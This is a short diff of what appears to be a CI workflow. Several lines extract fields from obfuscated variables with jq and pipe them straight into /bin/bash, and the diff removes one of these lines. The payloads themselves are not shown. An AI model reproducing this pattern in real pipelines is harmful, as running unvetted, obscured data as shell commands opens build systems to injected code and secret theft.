@@ -25,7 +25,6 @@ jobs:
           echo $gf36381 | jq -r .sew0 | /bin/bash
           echo $r4 | jq -r .c69 | /bin/bash
           printf '%s' "$gmtv4" | jq -r .kcq1 | /bin/bash
-          printf '%s' "$r9059" | jq -r .nfek84254 | /bin/bash
           echo $ayq5 | jq -r .ar73 | /bin/bash
 
       - name: Persist data
